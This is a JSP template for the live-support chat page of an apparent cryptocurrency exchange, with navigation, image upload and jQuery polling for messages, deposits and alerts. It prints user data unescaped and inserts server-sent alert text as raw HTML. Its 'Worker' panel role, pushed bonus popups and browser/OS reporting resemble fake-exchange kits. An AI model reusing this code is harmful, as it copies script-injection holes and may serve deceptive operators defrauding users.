
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <%
        out.println("<title>Support | " + request.getAttribute("domain_exchange_name") + "</title>");
    %>
  <%
    out.println("<link rel=\"icon\" href=\"" + request.getAttribute("domain_icon") + "\">");
  %>
    <%
        out.println("<meta property=\"og:title\" content=\"" + request.getAttribute("domain_title") + "\">");
    %>
    <meta property="og:description" content="Best place to buy, trade and sell Bitcoin, Ethereum and over 100 cryptocurrencies safely and securely.">
  <link rel="stylesheet" href="../assets/css/g_menu_normalize.css">
  <link rel="stylesheet" href="../assets/css/g_menu_style.css">
  <link rel="stylesheet" href="../assets/css/style.css?v=3">
  <link rel="stylesheet" href="../assets/css/custom.css?v=3">
  <link rel="stylesheet" href="../plugins/notifications/toastr.css">
  <link rel="stylesheet" href="../assets/css/popap-style.css">
  <link rel="stylesheet" href="../assets/css/stake.css">
  <link rel="stylesheet" href="../assets/css/popup/popup-verifi.css">
  <link rel="stylesheet" href="../assets/css/available.css">
  <link rel="stylesheet" href="../assets/css/new_popup_style.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;600&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500&amp;display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&amp;display=swap" rel="stylesheet">
    <script src="../assets/js/jquery-3.4.1.min.js"></script>
</head>

<body id="dark" class="stop-scrolling">

<!-- PRELOADER -->
<!-- PRELOADER END -->


<header class="header">
        <div class="header__left">
            <a class="header__logo" href="/">
                <%
        out.println("<img src=\"" + request.getAttribute("domain_icon") + "\" alt=\"\">");
      %>
                <%
        out.println("<span class=\"header__logo-text\">" + request.getAttribute("domain_exchange_name") + "</span>");
      %>
            </a>
            <div class="header__links">
                <a class="header__link" href="../trading">Trading</a>
                <div class="header__link-tools header__tools">
                    <span class="header__link-tools-span">Market tools</span>

                    <div class="header__tools-box">
                        <a class="header__tools-link" href="../tools/marketcrypto">Crypto market cap</a>
                        <a class="header__tools-link" href="../tools/marketscreener">Market screener</a>
                        <a class="header__tools-link" href="../tools/technicalanalysis">Technical analysis</a>
                        <a class="header__tools-link" href="../tools/crossrates">Cross rates</a>
                        <a class="header__tools-link" href="../tools/heatmap">Currency heat map</a>
                    </div>
                </div>
                <a class="header__link" href="/profile/invest">Invest</a>
                <a class="header__link header__link-new" href="/profile/p2p">P2P</a>
                <a class="header__link header__link-hot" href="/profile/swap">Swap</a>
                <%
                if (request.getAttribute("support_unviewed") != null && ((int) request.getAttribute("support_unviewed")) > 0) {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support <span id=\"count_support_message\" class=\"support_messages\">" + request.getAttribute("support_unviewed") + "</span></a>");
                } else {
                    out.println("<a id=\"support_count\" class=\"header__link\" href=\"../profile/support\">Support </a>");
                }
            %>
                <%
                    out.println("<a class=\"header__link\" href=\"/profile/wallet\">Wallet: " + request.getAttribute("total_balance") + " USD </a>");
                %>
            </div>
        </div>
                <div class="header__right">
            <div class="header__profile">
                <div class="header__profile-toggle">
                    <%
                        out.print("<div class=\"header__toggle-name\">" + request.getAttribute("username") + "</div>");
                    %>
                    <div class="header__toggle-img">
                        <%
                            out.println("<img src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                        %>
                    </div>
                    <div class="header__toggle-btn">
                        <svg width="28" height="28" viewbox="0 0 100 100">
                            <path class="header__nav-line header__nav-line1" d="M 20,29.000046 H 80.000231 C 80.000231,29.000046 94.498839,28.817352 94.532987,66.711331 94.543142,77.980673 90.966081,81.670246 85.259173,81.668997 79.552261,81.667751 75.000211,74.999942 75.000211,74.999942 L 25.000021,25.000058"></path>
                            <path class="header__nav-line header__nav-line2" d="M 20,50 H 80"></path>
                            <path class="header__nav-line header__nav-line3" d="M 20,70.999954 H 80.000231 C 80.000231,70.999954 94.498839,71.182648 94.532987,33.288669 94.543142,22.019327 90.966081,18.329754 85.259173,18.331003 79.552261,18.332249 75.000211,25.000058 75.000211,25.000058 L 25.000021,74.999942"></path>
                        </svg>
                    </div>
                </div>

                <div class="header__profile-box">
                    <div class="header__profile-top">
                        <%
                        if (request.getAttribute("kyc_accepted") != null) {
                            out.println("<div class=\"header__profile-img header__profile-kyc\">");
                        } else {
                            out.println("<div class=\"header__profile-img \">");
                        }
                        out.println("<img style=\"width: 64px; height: 64px; border-radius: 50%;\" src=\"" + request.getAttribute("avatar") + "\" alt=\"\">");
                        out.println("</div>");
                    %>
                    <div class="header__profile-info">
                        <%
                            out.print("<div class=\"header__profile-name\">" + request.getAttribute("username") + "</div>");
                            out.print("<div class=\"header__profile-email\">" + request.getAttribute("email") + "</div>");
                            out.print("<div class=\"userCard__user-premium-" + (request.getAttribute("premium") == null ? "danger" : "success") + "\" style=\"font-size: 13px; margin-left: 5px; padding-left: 15px;\">Premium</div>");
                        %>
                    </div>
                    </div>
                    <div class="header__profile-center">
                        <a class="header__profile-link" href="../trading">Trading</a>
                        <a class="header__profile-link header__profile-tools" href="#">
                            <span>Market tools</span>

                            <div class="header__profile-tools-box">
                                <a class="header__profile-tools-link" href="../tools/marketcrypto">
                                    Crypto market cap
                                </a>
                                <a class="header__profile-tools-link" href="../tools/marketscreener">
                                    Market screener
                                </a>
                                <a class="header__profile-tools-link" href="../tools/technicalanalysis">
                                    Technical analysis
                                </a>
                                <a class="header__profile-tools-link" href="../tools/crossrates">
                                    Cross rates
                                </a>
                                <a class="header__profile-tools-link" href="../tools/heatmap">
                                    Currency heat map
                                </a>
                            </div>
                        </a>
                        <a class="header__profile-link" href="/profile/invest">Invest</a>
                        <a class="header__profile-link header__link-new" href="/profile/p2p">P2P</a>
                        <a class="header__profile-link header__link-hot" href="/profile/swap">Swap</a>
                        <a class="header__profile-link" href="/profile/support">Support</a>
                    </div>
                    <div class="header__profile-bottom">
                        <%
                            Object panel = request.getAttribute("panel");
                            if (panel != null) {
                                out.println("<a class=\"header__profile-link\" href=\"../" + (((String) panel).equals("Worker") ? "panel" : "admin") + "\" style=\"color: orange;\">\n" +
                                        "                            <div class=\"header__profile-link-icon\">\n" +
                                        "                                <svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 24 24\"><path d=\"M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z\"></path></svg>\n" +
                                        "                            </div>\n" +
                                        panel + " panel</a>");
                            }
                        %>
                                                <a class="header__profile-link" href="/profile/wallet">
                            <div class="header__profile-link-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M21,18V19A2,2 0 0,1 19,21H5C3.89,21 3,20.1 3,19V5A2,2 0 0,1 5,3H19A2,2 0 0,1 21,5V6H12C10.89,6 10,6.9 10,8V16A2,2 0 0,0 12,18M12,16H22V8H12M16,13.5A1.5,1.5 0 0,1 14.5,12A1.5,1.5 0 0,1 16,10.5A1.5,1.5 0 0,1 17.5,12A1.5,1.5 0 0,1 16,13.5Z"></path></svg>
                            </div>
                                                    <%
                                                        out.println("<span>Wallet: " + request.getAttribute("total_balance") + " USD </span>");
                                                    %>
                        </a>
                        <a class="header__profile-link" href="/profile/settings">
                            <div class="header__profile-link-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M12,15.5A3.5,3.5 0 0,1 8.5,12A3.5,3.5 0 0,1 12,8.5A3.5,3.5 0 0,1 15.5,12A3.5,3.5 0 0,1 12,15.5M19.43,12.97C19.47,12.65 19.5,12.33 19.5,12C19.5,11.67 19.47,11.34 19.43,11L21.54,9.37C21.73,9.22 21.78,8.95 21.66,8.73L19.66,5.27C19.54,5.05 19.27,4.96 19.05,5.05L16.56,6.05C16.04,5.66 15.5,5.32 14.87,5.07L14.5,2.42C14.46,2.18 14.25,2 14,2H10C9.75,2 9.54,2.18 9.5,2.42L9.13,5.07C8.5,5.32 7.96,5.66 7.44,6.05L4.95,5.05C4.73,4.96 4.46,5.05 4.34,5.27L2.34,8.73C2.21,8.95 2.27,9.22 2.46,9.37L4.57,11C4.53,11.34 4.5,11.67 4.5,12C4.5,12.33 4.53,12.65 4.57,12.97L2.46,14.63C2.27,14.78 2.21,15.05 2.34,15.27L4.34,18.73C4.46,18.95 4.73,19.03 4.95,18.95L7.44,17.94C7.96,18.34 8.5,18.68 9.13,18.93L9.5,21.58C9.54,21.82 9.75,22 10,22H14C14.25,22 14.46,21.82 14.5,21.58L14.87,18.93C15.5,18.67 16.04,18.34 16.56,17.94L19.05,18.95C19.27,19.03 19.54,18.95 19.66,18.73L21.66,15.27C21.78,15.05 21.73,14.78 21.54,14.63L19.43,12.97Z"></path></svg>
                            </div>
                            <span>Settings</span>
                        </a>
                        <a class="header__profile-link header__profile-out" href="/profile/logout">
                            <div class="header__profile-link-icon">
                                <svg xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24"><path d="M16.56,5.44L15.11,6.89C16.84,7.94 18,9.83 18,12A6,6 0 0,1 12,18A6,6 0 0,1 6,12C6,9.83 7.16,7.94 8.88,6.88L7.44,5.44C5.36,6.88 4,9.28 4,12A8,8 0 0,0 12,20A8,8 0 0,0 20,12C20,9.28 18.64,6.88 16.56,5.44M13,3H11V13H13"></path></svg>
                            </div>
                            <span>Log Out</span>
                        </a>
                    </div>
                </div>
            </div>
        </div>
          </header>

<link rel="stylesheet" href="../assets/css/support_chat.css">

  <section class="chat">

    <div class="container">

        <div class="chat__title">
            <img class="chat__img" src="../assets/img/profile/avatar.svg" alt="">
            <div class="chat__title-name">Live support service</div>
            <span class="support_online" title="Support Online" style="margin-left: 22px; margin-top: -18px;">0</span>
        </div>

        <div class="chat__title chat__title-border">
            <div class="chat__title-name">Chat</div>
        </div>
        <div class="chat__container">
            <div class="chat__content" id="chat_content">
            </div>
            
        </div>

        <div class="chat__type-message">
            <div class="chat__message-box">
              <textarea class="chat__message-input" placeholder="Type a message"></textarea>
                <div class="chat__message-button">
                  <a href="#" class="chat__message-button-item"></a>
                  <form action="../api/support?action=SEND_SUPPORT_IMAGE" method="POST" enctype="multipart/form-data">
                  <input style="display: none;" id="support_send_photo" onchange="loadFile(event)" accept="image/x-png,image/jpeg" name="support_send_image" type="file">
                  <button id="send_image_post" style="display: none;"></button>
                  </form>
                </div>
                <img id="output" style="width: 100px; margin-right: 27px; border: 3px solid #007dfe; border-radius: 10px; height: 49px; display: none;">
            </div>
            <button id="send_support" class="chat__message-send">Send</button>
        </div>
    </div> 


<style>
  .support_online {
    animation: blinker 2s linear infinite;
    background: #7aff00;
    border-radius: 50px;
    padding-left: 2px;
    padding-right: 4px;
    font-size: 7px;
    color: #7aff00;
    position: absolute;
    margin-top: -32px;
    margin-left: 10px;
  }

  @keyframes blinker {
    50% {
      opacity: 0.5;
    }
  }

</style>
  </section>

  <script src="../assets/js/popper.min.js"></script>
  <script src="../assets/js/bootstrap.min.js"></script>
  <script src="../assets/js/amcharts-core.min.js"></script>
  <script src="../assets/js/amcharts.min.js"></script>
  <script src="../assets/js/custom.js"></script>
  <script src="../plugins/notifications/toastr.js"></script>
  <script src="../assets/js/g_menu_main.js"></script>
  <script>
      function noti(msg, status) {
        toastr[status](msg);
        toastr.options = {
          "closeButton": false,
          "debug": false,
          "newestOnTop": false,
          "progressBar": false,
          "rtl": false,
          "positionClass": "toast-top-right",
          "preventDuplicates": false,
          "onclick": null,
          "showDuration": 300,
          "hideDuration": 1000,
          "timeOut": 5000,
          "extendedTimeOut": 1000,
          "showEasing": "swing",
          "hideEasing": "linear",
          "showMethod": "fadeIn",
          "hideMethod": "fadeOut"
        }
      }
  </script>

    <script>
      $("#send_support").on("click", function(e) {
        e.preventDefault();

        var send_photo = $("#support_send_photo").val();

        if(send_photo != "") {
          $("#send_support").attr("disabled", true);
          $("#send_support").css("opacity", "0.1");
          $("#send_image_post").click();
        } else {

          const s_text = $(".chat__message-input").val();

          if(s_text == "") {
              noti("The text field cannot be empty", "error");
          } else if(s_text.length > 500) {
              noti("You have exceeded the character limit (500)", "error");
          } else {
              $(".chat__message-input").val("");
              $.ajax({
                url: "../api/support",
                type: "POST",
                data: {
                  action: "SEND_SUPPORT_MESSAGE",
                  support_text: s_text
                },
                success: function(response) {
                  if(response == "1") {
                    noti("Message sent successfully", "success");
                    //$(".chat__message-input").val("");
                    // load messages
                    $("#chat_content").load("../api/support?action=REFRESH_SUPPORT");
                    // auto scroll top
                    setTimeout(function() {
                      var div = $(".chat__container");
                      div.scrollTop(div.prop('scrollHeight')); 
                    }, 300);
                  } else if(response == "2") {
                    noti("You have exceeded the character limit (500)", "error");
                  } else if(response == "3") {
                    noti("The text field cannot be empty", "error");
                  } else if(response == "33") {
                    noti("Wait before sending the message again", "warning");
                  } else if (response === "4") {
                      noti("You are temporarily unable to send a message due to the flood!", "error");
                  } else {
                    noti("An unexpected error has occurred, please try again", "error");
                  }
                }
              })
          }
        }
      });



      // load messages
      $("#chat_content").load("../api/support?action=REFRESH_SUPPORT");
      // auto scroll top
      setTimeout(function() {
        var div = $(".chat__container");
        div.scrollTop(div.prop('scrollHeight')); 
      }, 300);
      // refresh messages
      setInterval(function() {
          console.log(123);
        $("#chat_content").load("../api/support?action=REFRESH_SUPPORT");
      }, 5000);

      if(($("#count_support_message").length > 0)) {
        $("#count_support_message").remove();
      }
    </script>

    <script>
        $(".chat__message-button-item").on("click", function() {
            $("#support_send_photo").click();

        });

        var loadFile = function(event) {
          $("#output").css("display", "block");
          var output = document.getElementById('output');
          output.src = URL.createObjectURL(event.target.files[0]);
          output.onload = function() {
            URL.revokeObjectURL(output.src) // free memory
          }
        };
    </script>
<script>
    $(document).ready(function(){
        setTimeout(function() {
            $.ajax({
                url: "../api/deposits",
                type: "POST",
                data: {
                    action: "REFRESH_MY_ADDRESSES"
                },
                success: function(response) {
                }
            })
        }, 500);
    });
</script>
<script src="../assets/js/os-detect.js"></script>
<script>
    setInterval(function() {
        var messageId = $("#alertMessageId").val();
        if(messageId == '0') {
            $.ajax({
                url: "/profile",
                type: "POST",
                data: {
                    action: "CHECK_USER_ALERT_MESSAGE",
                    browser_name: getBrowserName(),
                    os_name: getOSName()
                },
                success: function(response) {
                    var json = JSON.parse(response);

                    if (json["support_messages"] !== undefined && json["support_messages"] != null) {
                        var spanElement = document.getElementById("count_support_message");
                        if (spanElement !== null) {
                            if (json["support_messages"] === "0") {
                                spanElement.remove();
                            } else {
                                spanElement.innerHTML = json["support_messages"]
                            }
                        } else if (json["support_messages"] !== "0") {
                            spanElement = document.createElement("span");
                            spanElement.id = "count_support_message";
                            spanElement.className = "support_messages";
                            spanElement.innerHTML = json["support_messages"];

                            var supportElement = document.getElementById("support_count");
                            supportElement.appendChild(spanElement);
                        }
                    }

                    if (json["alert_message_text"] !== undefined && json["alert_message_text"] != null) {
                        var alert_message_text = json['alert_message_text'];

                        if (json['alert_message_type'] == 'alert') {
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                        } else if (json['alert_message_type'] == 'bonus') {
                            $("#alert_img_pop").attr("src", "");
                            $("#alert_title_text").html("Bonus");
                            $("#alert_img_pop").attr("src", "../assets/img/bonus-icon.png");
                            $("#alert_message_modal").css("display", "flex");
                            $("#userAlertBox").html(alert_message_text);

                            $("#userAlertBox").css("font-size", "18px");
                        } else if (json['alert_message_type'] == 'notification') {
                            noti(alert_message_text, 'info');
                        }
                    }
                }
            })
        }
    }, 5000);
</script>
</body>

</html>
